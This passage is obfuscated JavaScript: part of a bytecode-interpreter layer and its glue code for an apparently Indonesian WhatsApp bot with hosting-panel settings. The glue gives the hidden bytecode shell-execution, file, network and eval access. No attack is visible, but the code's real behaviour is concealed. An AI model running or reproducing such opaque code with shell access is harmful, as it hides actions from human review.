                                                ['_$lQV5eu']: xl,
                                            };
                                        ((xn = u0), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = D(xE, xl),
                                            u1 = xE();
                                        if (typeof u1 !== 'function')
                                            throw new TypeError(
                                                u1 + '\x20is\x20not\x20a\x20constructor'
                                            );
                                        if (R['has'](u1))
                                            throw new TypeError(
                                                u1['name'] + '\x20is\x20not\x20a\x20constructor'
                                            );
                                        let u2 = vmy_6c9c4d['_$nqVw0B'];
                                        vmy_6c9c4d['_$nqVw0B'] = undefined;
                                        let u3;
                                        try {
                                            u3 = Reflect['construct'](u1, u0);
                                        } finally {
                                            vmy_6c9c4d['_$nqVw0B'] = u2;
                                        }
                                        (xR(u3), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xD(),
                                            u2 = o(u1);
                                        (vmD(u2, u0, {
                                            set: xl,
                                            enumerable: u2 === u1,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(A[xc]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = O[xc] - 0x1;
                                        ((O[xc] = xl), xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 ^ xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 - xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        if (u0 === null || u0 === undefined)
                                            throw new TypeError(
                                                'Cannot\x20read\x20property\x20\x27' +
                                                    String(xl) +
                                                    '\x27\x20of\x20' +
                                                    u0
                                            );
                                        (xR(u0[xl]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 / xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 | xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10,
                                            u1 = O[xl],
                                            u2 = l[u0];
                                        (xR(u1[u2]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = l[xc],
                                            u2 = h();
                                        !u2['has'](u1) && u2['set'](u1, new WeakMap());
                                        let u3 = u2['get'](u1);
                                        if (u3['has'](u0))
                                            throw new TypeError(
                                                'Cannot\x20initialize\x20' +
                                                    u1 +
                                                    '\x20twice\x20on\x20the\x20same\x20object'
                                            );
                                        (u3['set'](u0, xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xl['next']();
                                        (xR(Promise['resolve'](u0)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        ((O[xc] = O[xc] + 0x1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(typeof xl === 'bigint' ? xl + 0x1n : +xl + 0x1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10,
                                            u1 = xE(),
                                            u2 = D(xE, u1),
                                            u3 = O[xl],
                                            u4 = l[u0],
                                            u5 = u3[u4];
                                        (xR(u5['apply'](u3, u2)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = l[xc];
                                        if (u0 === null || u0 === undefined)
                                            throw new TypeError(
                                                'Cannot\x20set\x20property\x20\x27' +
                                                    String(u1) +
                                                    '\x27\x20of\x20' +
                                                    u0
                                            );
                                        (f(u0, u1, xl, xI), xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD(),
                                            u1 = l[xc];
                                        (vmD(u0, u1, {
                                            set: xl,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xE(),
                                            u2 = B(u1),
                                            u3 = z(u2, u0);
                                        u3['desc'] && u3['desc']['set']
                                            ? u3['desc']['set']['call'](u1, xl)
                                            : (u1[u0] = xl);
                                        (xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        !xE() ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc],
                                            u1 = ![],
                                            u2 = I();
                                        if (u2) {
                                            let u3 = u2['get'](u0);
                                            u3 && u3['has'](xl) && (u1 = !![]);
                                        }
                                        (xR(u1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        if (xc === -0x1) xR(Symbol());
                                        else {
                                            let xl = xE();
                                            xR(Symbol(xl));
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD();
                                        (u0['push'](xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 in xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        if (x8['_$csazO3']) {
                                            let xl = x8['_$VmqNsa'];
                                            ((x8['_$csazO3'] = ![]),
                                                (x8['_$VmqNsa'] = undefined),
                                                (xf = !![]),
                                                (xh = xl));
                                            return;
                                        }
                                        if (x9['_$Mn6sWY']) {
                                            let u0 = x9['_$2fOqlh'];
                                            ((x9['_$Mn6sWY'] = ![]),
                                                (x9['_$2fOqlh'] = 0x0),
                                                (c = u0));
                                            break;
                                        }
                                        if (xx['_$8bHCYf']) {
                                            let u1 = xx['_$vsoyHz'];
                                            ((xx['_$8bHCYf'] = ![]),
                                                (xx['_$vsoyHz'] = 0x0),
                                                (c = u1));
                                            break;
                                        }
                                        if (x7 !== null) {
                                            let u2 = x7;
                                            x7 = null;
                                            throw u2;
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc];
                                        if (xl === '__this__') {
                                            let u5 = xn;
                                            while (u5) {
                                                if (u5['_$0SKFtw'] && '__this__' in u5['_$0SKFtw'])
                                                    throw new ReferenceError(
                                                        'Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization'
                                                    );
                                                if (u5['_$3NkOio'] && '__this__' in u5['_$3NkOio'])
                                                    break;
                                                u5 = u5['_$lQV5eu'];
                                            }
                                            (xR(W), c++);
                                            break;
                                        }
                                        let u0 = xn,
                                            u1,
                                            u2 = ![],
                                            u3 = xl['indexOf']('$$'),
                                            u4 = u3 !== -0x1 ? xl['substring'](0x0, u3) : null;
                                        while (u0) {
                                            if (u0['_$0SKFtw'] && xl in u0['_$0SKFtw'])
                                                throw new ReferenceError(
                                                    'Cannot\x20access\x20\x27' +
                                                        xl +
                                                        '\x27\x20before\x20initialization'
                                                );
                                            if (u4 && u0['_$0SKFtw'] && u4 in u0['_$0SKFtw']) {
                                                if (!(u0['_$3NkOio'] && xl in u0['_$3NkOio']))
                                                    throw new ReferenceError(
                                                        'Cannot\x20access\x20\x27' +
                                                            u4 +
                                                            '\x27\x20before\x20initialization'
                                                    );
                                            }
                                            if (u0['_$3NkOio'] && xl in u0['_$3NkOio']) {
                                                ((u1 = u0['_$3NkOio'][xl]), (u2 = !![]));
                                                break;
                                            }
                                            u0 = u0['_$lQV5eu'];
                                        }
                                        !u2 &&
                                            (xl in vmy_6c9c4d
                                                ? (u1 = vmy_6c9c4d[xl])
                                                : (u1 = vmV[xl]));
                                        (xR(u1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        xE() ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 * xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(typeof xl === 'bigint' ? xl - 0x1n : +xl - 0x1), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc];
                                        if (xl == null) {
                                            (xR(undefined), c++);
                                            break;
                                        }
                                        let u1 = h(),
                                            u2 = u1['get'](u0);
                                        if (!u2 || !u2['has'](xl))
                                            throw new TypeError(
                                                'Cannot\x20read\x20private\x20member\x20' +
                                                    u0 +
                                                    '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                            );
                                        (xR(u2['get'](xl)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xD();
                                        (vmD(u1['prototype'], u0, {
                                            value: xl,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        throw xE();
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(xn), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 + xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 < xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc];
                                        xl === null || xl === undefined
                                            ? xR(undefined)
                                            : xR(xl[u0]);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xD();
                                        (xl['length']++, c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD(),
                                            u1 = l[xc];
                                        (vmD(u0, u1, {
                                            get: xl,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(Symbol['keyFor'](xl)), c++);
                                        break;
                                    }
                                },
                            ];
                    ((xI = xU),
                        (xi = xG),
                        (xK = xk),
                        (xa = xH),
                        (xt = xj),
                        (xm = xb),
                        (xd = xL),
                        (xn = xz),
                        xJ[xg[xP]](xS),
                        (xz = xn),
                        (xj = xt));
                    if (xf) return ((xf = ![]), xh);
                }
                break;
            } catch (xc) {
                if (x6['length'] > 0x0) {
                    let xl = x6[x6['length'] - 0x1];
                    Y = xl['_$KMG5He'];
                    if (xl['_$xhxcOJ'] !== undefined)
                        (xR(xc),
                            (c = xl['_$xhxcOJ']),
                            (xl['_$xhxcOJ'] = undefined),
                            xl['_$Vdn9lU'] === undefined && x6['pop']());
                    else
                        xl['_$Vdn9lU'] !== undefined
                            ? ((c = xl['_$Vdn9lU']), (xl['_$SGa8YC'] = xc))
                            : ((c = xl['_$2AXo24']), x6['pop']());
                    continue;
                }
                throw xc;
            }
        }
        return Y > 0x0 ? xE() : xj ? W : undefined;
    }
    let P = function (S, A, p, X, w, W) {
            vmy_6c9c4d['_$lg2MJY']
                ? (vmy_6c9c4d['_$lg2MJY'] = ![])
                : (vmy_6c9c4d['_$nqVw0B'] = undefined);
            let s = W === G ? this : W,
                Y = u(S);
            return Q(Y, A, p, X, w, s);
        },
        r = async function (S, A, p, X, w, W, s) {
            let Y = s === G ? this : s,
                O = u(S),
                c = Z(O, A, p, X, w, Y),
                l = c['next']();
            while (!l['done']) {
                if (l['value']['_$zhPVt2'] !== k)
                    throw new Error('Unexpected\x20yield\x20in\x20async\x20context');
                try {
                    let x0 = await Promise['resolve'](l['value']['_$ZARUn1']);
                    ((vmy_6c9c4d['_$nqVw0B'] = W), (l = c['next'](x0)));
                } catch (x1) {
                    ((vmy_6c9c4d['_$nqVw0B'] = W), (l = c['throw'](x1)));
                }
            }
            return l['value'];
        },
        T = function (S, A, p, X, w, W) {
            let s = W === G ? this : W,
                Y = u(S),
                O = Z(Y, A, p, X, undefined, s),
                c = ![],
                l = null,
                x0 = undefined,
                x1 = ![];
            function x2(x7, x8) {
                if (c) return { value: undefined, done: !![] };
                vmy_6c9c4d['_$nqVw0B'] = w;
                if (l) {
                    let xx;
                    try {
                        xx = x8
                            ? typeof l['throw'] === 'function'
                                ? l['throw'](x7)
                                : ((l = null),
                                  (function () {
                                      throw x7;
                                  })())
                            : l['next'](x7);
                    } catch (xu) {
                        l = null;
                        try {
                            let xU = O['throw'](xu);
                            return x3(xU);
                        } catch (xG) {
                            c = !![];
                            throw xG;
                        }
                    }
                    if (!xx['done']) return { value: xx['value'], done: ![] };
                    ((l = null), (x7 = xx['value']), (x8 = ![]));
                }
                let x9;
                try {
                    x9 = x8 ? O['throw'](x7) : O['next'](x7);
                } catch (xk) {
                    c = !![];
                    throw xk;
                }
                return x3(x9);
            }
            function x3(x7) {
                if (x7['done']) {
                    c = !![];
                    if (x1) return ((x1 = ![]), { value: x0, done: !![] });
                    return { value: x7['value'], done: !![] };
                }
                let x8 = x7['value'];
                if (x8['_$zhPVt2'] === H) return { value: x8['_$ZARUn1'], done: ![] };
                if (x8['_$zhPVt2'] === b) {
                    let x9 = x8['_$ZARUn1'],
                        xx = x9;
                    xx &&
                        typeof xx[Symbol['iterator']] === 'function' &&
                        (xx = xx[Symbol['iterator']]());
                    if (xx && typeof xx['next'] === 'function') {
                        let xu = xx['next']();
                        if (!xu['done']) return ((l = xx), { value: xu['value'], done: ![] });
                        return x2(xu['value'], ![]);
                    }
                    return x2(undefined, ![]);
                }
                throw new Error('Unexpected\x20signal\x20in\x20generator');
            }
            let x4 = Y && Y['s'],
                x5 = async function (x7) {
                    if (c) return { value: x7, done: !![] };
                    if (l && typeof l['return'] === 'function') {
                        try {
                            await l['return']();
                        } catch (x9) {}
                        l = null;
                    }
                    let x8;
                    try {
                        ((vmy_6c9c4d['_$nqVw0B'] = w),
                            (x8 = O['next']({ ['_$zhPVt2']: q, ['_$ZARUn1']: x7 })));
                    } catch (xx) {
                        c = !![];
                        throw xx;
                    }
                    while (!x8['done']) {
                        let xu = x8['value'];
                        if (xu['_$zhPVt2'] === k)
                            try {
                                let xU = await Promise['resolve'](xu['_$ZARUn1']);
                                ((vmy_6c9c4d['_$nqVw0B'] = w), (x8 = O['next'](xU)));
                            } catch (xG) {
                                ((vmy_6c9c4d['_$nqVw0B'] = w), (x8 = O['throw'](xG)));
                            }
                        else {
                            if (xu['_$zhPVt2'] === H)
                                try {
                                    ((vmy_6c9c4d['_$nqVw0B'] = w), (x8 = O['next']()));
                                } catch (xk) {
                                    c = !![];
                                    throw xk;
                                }
                            else break;
                        }
                    }
                    return ((c = !![]), { value: x8['value'], done: !![] });
                },
                x6 = function (x7) {
                    if (c) return { value: x7, done: !![] };
                    if (l && typeof l['return'] === 'function') {
                        try {
                            l['return']();
                        } catch (x9) {}
                        l = null;
                    }
                    ((x0 = x7), (x1 = !![]));
                    let x8;
                    try {
                        ((vmy_6c9c4d['_$nqVw0B'] = w),
                            (x8 = O['next']({ ['_$zhPVt2']: q, ['_$ZARUn1']: x7 })));
                    } catch (xx) {
                        ((c = !![]), (x1 = ![]));
                        throw xx;
                    }
                    if (!x8['done'] && x8['value'] && x8['value']['_$zhPVt2'] === H)
                        return { value: x8['value']['_$ZARUn1'], done: ![] };
                    return ((c = !![]), (x1 = ![]), { value: x8['value'], done: !![] });
                };
            if (x4) {
                let x7 = async function (x9, xx) {
                    if (c) return { value: undefined, done: !![] };
                    vmy_6c9c4d['_$nqVw0B'] = w;
                    if (l) {
                        let xU;
                        try {
                            xU = xx
                                ? typeof l['throw'] === 'function'
                                    ? await l['throw'](x9)
                                    : ((l = null),
                                      (function () {
                                          throw x9;
                                      })())
                                : await l['next'](x9);
                        } catch (xG) {
                            l = null;
                            try {
                                vmy_6c9c4d['_$nqVw0B'] = w;
                                let xk = O['throw'](xG);
                                return await x8(xk);
                            } catch (xH) {
                                c = !![];
                                throw xH;
                            }
                        }
                        if (!xU['done']) return { value: xU['value'], done: ![] };
                        ((l = null), (x9 = xU['value']), (xx = ![]));
                    }
                    let xu;
                    try {
                        xu = xx ? O['throw'](x9) : O['next'](x9);
                    } catch (xb) {
                        c = !![];
                        throw xb;
                    }
                    return await x8(xu);
                };
                async function x8(x9) {
                    while (!x9['done']) {
                        let xx = x9['value'];
                        if (xx['_$zhPVt2'] === k) {
                            let xu;
                            try {
                                ((xu = await Promise['resolve'](xx['_$ZARUn1'])),
                                    (vmy_6c9c4d['_$nqVw0B'] = w),
                                    (x9 = O['next'](xu)));
                            } catch (xU) {
                                ((vmy_6c9c4d['_$nqVw0B'] = w), (x9 = O['throw'](xU)));
                            }
                            continue;
                        }
                        if (xx['_$zhPVt2'] === H) return { value: xx['_$ZARUn1'], done: ![] };
                        if (xx['_$zhPVt2'] === b) {
                            let xG = xx['_$ZARUn1'],
                                xk = xG;
                            if (xk && typeof xk[Symbol['asyncIterator']] === 'function')
                                xk = xk[Symbol['asyncIterator']]();
                            else
                                xk &&
                                    typeof xk[Symbol['iterator']] === 'function' &&
                                    (xk = xk[Symbol['iterator']]());
                            if (xk && typeof xk['next'] === 'function') {
                                let xH = await xk['next']();
                                if (!xH['done'])
                                    return ((l = xk), { value: xH['value'], done: ![] });
                                ((vmy_6c9c4d['_$nqVw0B'] = w), (x9 = O['next'](xH['value'])));
                                continue;
                            }
                            ((vmy_6c9c4d['_$nqVw0B'] = w), (x9 = O['next'](undefined)));
                            continue;
                        }
                        throw new Error('Unexpected\x20signal\x20in\x20async\x20generator');
                    }
                    c = !![];
                    if (x1) return ((x1 = ![]), { value: x0, done: !![] });
                    return { value: x9['value'], done: !![] };
                }
                return {
                    next: function (x9) {
                        return x7(x9, ![]);
                    },
                    return: x5,
                    throw: function (x9) {
                        if (c) return Promise['reject'](x9);
                        return x7(x9, !![]);
                    },
                    [Symbol['asyncIterator']]: function () {
                        return this;
                    },
                };
            } else
                return {
                    next: function (x9) {
                        return x2(x9, ![]);
                    },
                    return: x6,
                    throw: function (x9) {
                        if (c) throw x9;
                        return x2(x9, !![]);
                    },
                    [Symbol['iterator']]: function () {
                        return this;
                    },
                };
        };
    return function (S, A, p, X, w) {
        let W = u(S);
        if (W && W['g']) {
            let s = vmy_6c9c4d['_$nqVw0B'];
            return T['call'](this, S, A, p, X, s, G);
        }
        if (W && W['s']) {
            let Y = vmy_6c9c4d['_$nqVw0B'];
            return r['call'](this, S, A, p, X, w, Y, G);
        }
        if (W && W['st'] && this === vmV) return P(S, A, p, X, w, undefined);
        return P['call'](this, S, A, p, X, w, G);
    };
})();
try {
    (process,
        Object['defineProperty'](vmy_6c9c4d, 'process', {
            get: function () {
                return process;
            },
            set: function (x) {
                process = x;
            },
            configurable: !![],
        }));
} catch (vmuH) {}
try {
    (console,
        Object['defineProperty'](vmy_6c9c4d, 'console', {
            get: function () {
                return console;
            },
            set: function (x) {
                console = x;
            },
            configurable: !![],
        }));
} catch (vmub) {}
try {
    (JSON,
        Object['defineProperty'](vmy_6c9c4d, 'JSON', {
            get: function () {
                return JSON;
            },
            set: function (x) {
                JSON = x;
            },
            configurable: !![],
        }));
} catch (vmuq) {}
try {
    (String,
        Object['defineProperty'](vmy_6c9c4d, 'String', {
            get: function () {
                return String;
            },
            set: function (x) {
                String = x;
            },
            configurable: !![],
        }));
} catch (vmuy) {}
try {
    (global,
        Object['defineProperty'](vmy_6c9c4d, 'global', {
            get: function () {
                return global;
            },
            set: function (x) {
                global = x;
            },
            configurable: !![],
        }));
} catch (vmuF) {}
try {
    (owner,
        Object['defineProperty'](vmy_6c9c4d, 'owner', {
            get: function () {
                return owner;
            },
            set: function (x) {
                owner = x;
            },
            configurable: !![],
        }));
} catch (vmuM) {}
try {
    (namaBot,
        Object['defineProperty'](vmy_6c9c4d, 'namaBot', {
            get: function () {
                return namaBot;
            },
            set: function (x) {
                namaBot = x;
            },
            configurable: !![],
        }));
} catch (vmuV) {}
try {
    (namaOwner,
        Object['defineProperty'](vmy_6c9c4d, 'namaOwner', {
            get: function () {
                return namaOwner;
            },
            set: function (x) {
                namaOwner = x;
            },
            configurable: !![],
        }));
} catch (vmuR) {}
try {
    (generateWAMessageContent,
        Object['defineProperty'](vmy_6c9c4d, 'generateWAMessageContent', {
            get: function () {
                return generateWAMessageContent;
            },
            set: function (x) {
                generateWAMessageContent = x;
            },
            configurable: !![],
        }));
} catch (vmuE) {}
try {
    (crypto,
        Object['defineProperty'](vmy_6c9c4d, 'crypto', {
            get: function () {
                return crypto;
            },
            set: function (x) {
                crypto = x;
            },
            configurable: !![],
        }));
} catch (vmuD) {}
try {
    (runtime,
        Object['defineProperty'](vmy_6c9c4d, 'runtime', {
            get: function () {
                return runtime;
            },
            set: function (x) {
                runtime = x;
            },
            configurable: !![],
        }));
} catch (vmuC) {}
try {
    (mess,
        Object['defineProperty'](vmy_6c9c4d, 'mess', {
            get: function () {
                return mess;
            },
            set: function (x) {
                mess = x;
            },
            configurable: !![],
        }));
} catch (vmuv) {}
try {
    (RegExp,
        Object['defineProperty'](vmy_6c9c4d, 'RegExp', {
            get: function () {
                return RegExp;
            },
            set: function (x) {
                RegExp = x;
            },
            configurable: !![],
        }));
} catch (vmuo) {}
try {
    (Date,
        Object['defineProperty'](vmy_6c9c4d, 'Date', {
            get: function () {
                return Date;
            },
            set: function (x) {
                Date = x;
            },
            configurable: !![],
        }));
} catch (vmuB) {}
try {
    (setTimeout,
        Object['defineProperty'](vmy_6c9c4d, 'setTimeout', {
            get: function () {
                return setTimeout;
            },
            set: function (x) {
                setTimeout = x;
            },
            configurable: !![],
        }));
} catch (vmuz) {}
try {
    (sick,
        Object['defineProperty'](vmy_6c9c4d, 'sick', {
            get: function () {
                return sick;
            },
            set: function (x) {
                sick = x;
            },
            configurable: !![],
        }));
} catch (vmuL) {}
try {
    (encodeURIComponent,
        Object['defineProperty'](vmy_6c9c4d, 'encodeURIComponent', {
            get: function () {
                return encodeURIComponent;
            },
            set: function (x) {
                encodeURIComponent = x;
            },
            configurable: !![],
        }));
} catch (vmue) {}
try {
    (Math,
        Object['defineProperty'](vmy_6c9c4d, 'Math', {
            get: function () {
                return Math;
            },
            set: function (x) {
                Math = x;
            },
            configurable: !![],
        }));
} catch (vmuj) {}
try {
    (Number,
        Object['defineProperty'](vmy_6c9c4d, 'Number', {
            get: function () {
                return Number;
            },
            set: function (x) {
                Number = x;
            },
            configurable: !![],
        }));
} catch (vmuf) {}
try {
    (Object,
        Object['defineProperty'](vmy_6c9c4d, 'Object', {
            get: function () {
                return Object;
            },
            set: function (x) {
                Object = x;
            },
            configurable: !![],
        }));
} catch (vmuh) {}
try {
    (parseInt,
        Object['defineProperty'](vmy_6c9c4d, 'parseInt', {
            get: function () {
                return parseInt;
            },
            set: function (x) {
                parseInt = x;
            },
            configurable: !![],
        }));
} catch (vmuI) {}
try {
    (Promise,
        Object['defineProperty'](vmy_6c9c4d, 'Promise', {
            get: function () {
                return Promise;
            },
            set: function (x) {
                Promise = x;
            },
            configurable: !![],
        }));
} catch (vmui) {}
try {
    (getRandom,
        Object['defineProperty'](vmy_6c9c4d, 'getRandom', {
            get: function () {
                return getRandom;
            },
            set: function (x) {
                getRandom = x;
            },
            configurable: !![],
        }));
} catch (vmuK) {}
try {
    (isNaN,
        Object['defineProperty'](vmy_6c9c4d, 'isNaN', {
            get: function () {
                return isNaN;
            },
            set: function (x) {
                isNaN = x;
            },
            configurable: !![],
        }));
} catch (vmua) {}
try {
    (capital,
        Object['defineProperty'](vmy_6c9c4d, 'capital', {
            get: function () {
                return capital;
            },
            set: function (x) {
                capital = x;
            },
            configurable: !![],
        }));
} catch (vmut) {}
try {
    (fetch,
        Object['defineProperty'](vmy_6c9c4d, 'fetch', {
            get: function () {
                return fetch;
            },
            set: function (x) {
                fetch = x;
            },
            configurable: !![],
        }));
} catch (vmum) {}
try {
    (domainV2,
        Object['defineProperty'](vmy_6c9c4d, 'domainV2', {
            get: function () {
                return domainV2;
            },
            set: function (x) {
                domainV2 = x;
            },
            configurable: !![],
        }));
} catch (vmud) {}
try {
    (apikeyV2,
        Object['defineProperty'](vmy_6c9c4d, 'apikeyV2', {
            get: function () {
                return apikeyV2;
            },
            set: function (x) {
                apikeyV2 = x;
            },
            configurable: !![],
        }));
} catch (vmun) {}
try {
    (tanggal,
        Object['defineProperty'](vmy_6c9c4d, 'tanggal', {
            get: function () {
                return tanggal;
            },
            set: function (x) {
                tanggal = x;
            },
            configurable: !![],
        }));
} catch (vmug) {}
try {
    (nestidV2,
        Object['defineProperty'](vmy_6c9c4d, 'nestidV2', {
            get: function () {
                return nestidV2;
            },
            set: function (x) {
                nestidV2 = x;
            },
            configurable: !![],
        }));
} catch (vmuJ) {}
try {
    (eggV2,
        Object['defineProperty'](vmy_6c9c4d, 'eggV2', {
            get: function () {
                return eggV2;
            },
            set: function (x) {
                eggV2 = x;
            },
            configurable: !![],
        }));
} catch (vmuN) {}
try {
    (locV2,
        Object['defineProperty'](vmy_6c9c4d, 'locV2', {
            get: function () {
                return locV2;
            },
            set: function (x) {
                locV2 = x;
            },
            configurable: !![],
        }));
} catch (vmuQ) {}
try {
    (Reply,
        Object['defineProperty'](vmy_6c9c4d, 'Reply', {
            get: function () {
                return Reply;
            },
            set: function (x) {
                Reply = x;
            },
            configurable: !![],
        }));
} catch (vmuZ) {}
try {
    (nestid,
        Object['defineProperty'](vmy_6c9c4d, 'nestid', {
            get: function () {
                return nestid;
            },
            set: function (x) {
                nestid = x;
            },
            configurable: !![],
        }));
} catch (vmuP) {}
try {
    (egg,
        Object['defineProperty'](vmy_6c9c4d, 'egg', {
            get: function () {
                return egg;
            },
            set: function (x) {
                egg = x;
            },
            configurable: !![],
        }));
} catch (vmur) {}
try {
    (loc,
        Object['defineProperty'](vmy_6c9c4d, 'loc', {
            get: function () {
                return loc;
            },
            set: function (x) {
                loc = x;
            },
            configurable: !![],
        }));
} catch (vmuT) {}
try {
    (domain,
        Object['defineProperty'](vmy_6c9c4d, 'domain', {
            get: function () {
                return domain;
            },
            set: function (x) {
                domain = x;
            },
            configurable: !![],
        }));
} catch (vmuS) {}
try {
    (apikey,
        Object['defineProperty'](vmy_6c9c4d, 'apikey', {
            get: function () {
                return apikey;
            },
            set: function (x) {
                apikey = x;
            },
            configurable: !![],
        }));
} catch (vmuA) {}
try {
    (eval,
        Object['defineProperty'](vmy_6c9c4d, 'eval', {
            get: function () {
                return eval;
            },
            configurable: !![],
        }));
} catch (vmup) {}
((vmy_6c9c4d['_$S66XRr'] = {
    datagc: !![],
    dataBot: !![],
    owners: !![],
    premium: !![],
    __filename: !![],
}),
    (vmy_6c9c4d['generateWAMessageFromContent'] = generateWAMessageFromContent),
    (vmy_6c9c4d['proto'] = proto),
    (vmy_6c9c4d['prepareWAMessageMedia'] = prepareWAMessageMedia),
    (vmy_6c9c4d['downloadContentFromMessage'] = downloadContentFromMessage),
    (vmy_6c9c4d['axios'] = vmj),
    (vmy_6c9c4d['FormData'] = vmf),
    (vmy_6c9c4d['fs'] = vmh),
    (vmy_6c9c4d['path'] = vmI),
    (vmy_6c9c4d['fsSync'] = vmi),
    (vmy_6c9c4d['chalk'] = vmK),
    (vmy_6c9c4d['fileURLToPath'] = fileURLToPath),
    (vmy_6c9c4d['pathToFileURL'] = pathToFileURL),
    (vmy_6c9c4d['exec'] = exec),
    (vmy_6c9c4d['execSync'] = execSync),
    (vmy_6c9c4d['spawn'] = spawn),
    (vmy_6c9c4d['util'] = vma),
    (vmy_6c9c4d['createCanvas'] = createCanvas),
    (vmy_6c9c4d['registerFont'] = registerFont),
    (vmy_6c9c4d['performance'] = performance),
    (vmy_6c9c4d['os'] = vmt),
    (vmy_6c9c4d['fileTypeFromBuffer'] = fileTypeFromBuffer),
    (vmy_6c9c4d['yts'] = vmm),
    (vmy_6c9c4d['ytdl'] = vmd),
    process['on']('uncaughtException', (x) => {
        return vmk_86dd04['call'](this, 0x0, [x], undefined, undefined, undefined);
    }));
const datagc = JSON['parse'](vmy_6c9c4d['fsSync']['readFileSync']('./data/reseller.json'));
vmy_6c9c4d['datagc'] = datagc;
globalThis['datagc'] = vmy_6c9c4d['datagc'];
vmy_6c9c4d['datagc'] = datagc;
globalThis['datagc'] = vmy_6c9c4d['datagc'];
delete vmy_6c9c4d['_$S66XRr']['datagc'];
export const fitur = JSON['parse'](vmy_6c9c4d['fsSync']['readFileSync']('./data/setbot.json'));
const dataBot = vmy_6c9c4d['path']['join'](process['cwd'](), 'data', 'setbot.json');
vmy_6c9c4d['dataBot'] = dataBot;
globalThis['dataBot'] = vmy_6c9c4d['dataBot'];
vmy_6c9c4d['dataBot'] = dataBot;
globalThis['dataBot'] = vmy_6c9c4d['dataBot'];
delete vmy_6c9c4d['_$S66XRr']['dataBot'];
const owners = JSON['parse'](vmy_6c9c4d['fs']['readFileSync']('./data/owner.json'));
vmy_6c9c4d['owners'] = owners;
globalThis['owners'] = vmy_6c9c4d['owners'];
vmy_6c9c4d['owners'] = owners;
globalThis['owners'] = vmy_6c9c4d['owners'];
